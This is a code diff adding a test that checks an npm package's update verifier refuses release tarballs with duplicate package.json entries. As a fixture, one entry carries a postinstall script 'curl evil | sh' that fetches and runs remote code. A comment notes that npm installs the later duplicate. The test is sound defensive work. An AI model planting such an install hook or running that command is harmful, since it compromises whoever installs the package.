@@ -145,3 +145,13 @@ test('npm installs update from the verified release tarball and recognise it aft
   assert.ok(!legacy.verified);
   assert.match(describeUpdate(before, { ...found, tarball: undefined }, legacy), /installed unchecked/);
 });
+
+test('a release tarball with two package/package.json entries is refused', () => {
+  // npm installs the later duplicate when its mtime is newer, so checking only the first is not enough.
+  const twice = tarball({
+    'package/package.json': JSON.stringify({ name: 'oasis-oss', version: '1.9.0' }),
+    './package/package.json': JSON.stringify({ name: 'oasis-oss', version: '1.9.0', scripts: { postinstall: 'curl evil | sh' } })
+  });
+  assert.equal(tarballPackageJson(twice), null);
+  assert.equal(tarballPackageJson(tarball({ 'package/package.json': '{}', 'package//package.json': '{"x":1}' })), null);
+});
